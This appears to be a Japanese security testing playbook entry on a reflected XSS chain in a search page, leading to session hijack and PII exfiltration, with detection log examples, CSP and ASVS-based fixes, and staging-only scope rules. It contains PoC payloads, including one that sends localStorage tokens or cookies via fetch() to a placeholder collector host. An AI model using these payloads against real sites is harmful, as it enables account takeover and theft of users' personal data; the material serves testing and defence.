02_chains/xss-ref-sess-pii.md

# Reflected XSSでセッション乗っ取りしPIIを流出させる
**Tags:** family:xss / variant:ref / engine:- / pivot:sess / impact:pii  
**Refs:** ASVS（Encoding/Sanitization・CSP）・WSTG（Reflected XSS）・MITRE ATT&CK（T1539・T1550.004）・PortSwigger WSA（Reflected XSS）・PayloadsAllTheThings（XSS Injection）・HackTricks（XSS）  
**Trace:** created: 2025-10-07 / last-review: 2025-10-07 / owner: you

## 概要
検索機能（Search）でユーザ入力がそのままHTMLに反映される反射型XSS（Reflected XSS）を起点に、被害者ブラウザで任意JSを実行し、セッションクッキーやBearerトークン（localStorage等）を窃取、あるいは被害者権限でPIIエンドポイントへ非対話リクエストを送らせ、個人情報（PII）を攻撃者へ送出する攻撃連鎖。

## 前提・境界（Non-Destructive）
- 対象は検証用/ステージング、テスト用アカウントのみ。大量送信・DoS・第三者配布は禁止。  
- PII/トークンは表示例では必ず伏せ字（`****`）。実データの外部送信は禁止（自己ホストのダミー収集エンドポイント等で代替）。  
- ブラウザ/拡張機能の自動保護（CSP/拡張）を迂回する試験は実施しない。  

## 入口（Initial Access）
- 反射点：`/search?q=<payload>` が結果ページに無エスケープで混入。  
- 最小PoC（無害確認）：  
```
GET /search?q=%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1
Host: target.example.com
```
- 文脈ごとの調整（例）：属性内→`"><svg onload=alert(1)>`、JS文字列内→`';alert(1);//`。  

## 横展開（Pivot / Privilege Escalation）
- セッション奪取（cookieがHttpOnlyでない場合）：`document.cookie` を読み取り、攻撃者管理の収集エンドポイントへ送信（ステージング限定）。  
- トークン窃取：SPAで`localStorage.access_token`等を参照できる場合は同様に送信。  
- セッションライディング：cookieがHttpOnlyでも、被害者権限で機能APIに`fetch()`を送らせPII（`/api/v1/users/me`,`/api/v1/export/csv`等）を取得→攻撃者へ送信。  
- 管理系到達：権限不備があれば`/admin/*`参照やアカウント横取り（password reset CSRF連携）へ拡大。  

## 到達点（Impact）
- 被害者アカウントの完全ななりすまし（MFA迂回の可能性）。  
- 顧客名・住所・電話・メール等のPII、注文履歴、請求書CSVの流出。  
- ビジネス側：不正注文・ポイント詐取・情報漏えい報告対応コスト増。  

## 検知・証跡（Detection & Evidence）
- アプリ/リバースプロキシログ：`/search` への不審クエリ（`<script`,`onerror=`,`javascript:` 等）。  
- 監査ログ：被害者セッションIDでの短時間多量アクセス、IP/UA不一致。  
- CSPレポート（`Content-Security-Policy-Report-Only` + `report-to`）：違反レポートに`blocked-uri`/`script-sample`が記録。  
- 例（JST）：  
  - `2025-10-07T14:21:03+09:00 request_id=abc123 path=/search q="%3Csvg%20onload%3Dfetch(...)" user=guest ip=****`  
  - `2025-10-07T14:21:05+09:00 request_id=def456 path=/api/v1/export/csv user=alice session=**** size=524288`  

## 是正・防御（Fix / Defense）
- **出力エンコーディング**：テンプレートの自動エスケープを強制。HTML/属性/JS/URLの**文脈別（contextual）**エンコーディングを実装（ASVS v5.0.0-1.3.x）。  
- **入力検証**：許可リスト（allowlist）＋正規化後の検証。危険シンボルの除去に依存しない（ASVS v5.0.0-1.1.x）。  
- **DOM XSS対策**：`innerHTML`直書きを避け、`textContent`/`setAttribute`等を使用（ASVS v5.0.0-1.5.x）。  
- **CSP**：`default-src 'none'; base-uri 'none'; object-src 'none'; script-src 'self' 'nonce-<runtime>'; connect-src 'self'; frame-ancestors 'none'` をベースに、ハッシュ/ノンスでインラインを許可（ASVS v5.0.0-3.4.6）。  
- **セッション保護**：`Set-Cookie: HttpOnly; Secure; SameSite=Lax/Strict`、長寿命トークンをクッキーに集約（ASVS v5.0.0-2.1.x）。  
- **認可**：機能/APIごとの権限確認を強制し、被害者権限でのデータ横取りを抑止（ASVS v5.0.0-4.x）。  
- **監視**：CSP Report-To、WAFのXSSシグネチャ、PIIエクスポートの行動分析検知（ASVS v5.0.0-10.x）。  

## バリエーション
- 反射文脈：プレーンHTML、属性、JS文字列、URLコンテキスト、テンプレート（CSTI連動）。  
- フィルタ迂回：Unicode正規化、HTMLエンティティ二重化、イベントハンドラ/タグ多様化、`data:`/`blob:`等。  
- 配信面：エラーページ、検索結果、プレビュー、パンくず/タイトル、JSONの`callback`（JSONP）。  

## 再現手順（Minimal Steps）
1) テストユーザでログインし、`/search?q=` の反射点を特定。  
2) 最小PoCでJS実行を確認（例：`<script>alert(1)</script>`）。  
3) **非破壊**な挙動確認：`fetch('/whoami')`等の自己参照APIで被害者権限実行を検証。  
4) （ステージングのみ）`HttpOnly`無効や`localStorage`にトークンがある場合、マスクした形で収集先に送信テスト：  
```
GET /search?q=%3Cimg%20src%3Dx%20onerror%3Dfetch('https://collector.example.net/log?tok='%2bencodeURIComponent((localStorage.access_token||document.cookie||'none')))%3E
```
5) `export/csv`等のPIIエンドポイントに被害者権限でアクセスさせ、レスポンスサイズやHTTP 200を証跡として取得（外部送信は禁止）。  

## 参照
1. OWASP ASVS 5.0.0（公式PDF。Encoding/Sanitization, CSP, Session等の要件群を参照）  
   https://github.com/OWASP/ASVS/releases/download/v5.0.0/OWASP_Application_Security_Verification_Standard_5.0.0_en.pdf
2. OWASP WSTG — Testing for Reflected Cross-Site Scripting  
   https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting
3. PortSwigger Web Security Academy — Reflected XSS  
   https://portswigger.net/web-security/cross-site-scripting/reflected
4. PayloadsAllTheThings — XSS Injection  
   https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection
5. HackTricks — XSS (Cross Site Scripting)  
   https://angelica.gitbook.io/hacktricks/pentesting-web/xss-cross-site-scripting
6. MITRE ATT&CK — T1539 Steal Web Session Cookie  
   https://attack.mitre.org/techniques/T1539/
7. MITRE ATT&CK — T1550.004 Use Alternate Authentication Material: Web Session Cookie  
   https://attack.mitre.org/techniques/T1550/004/
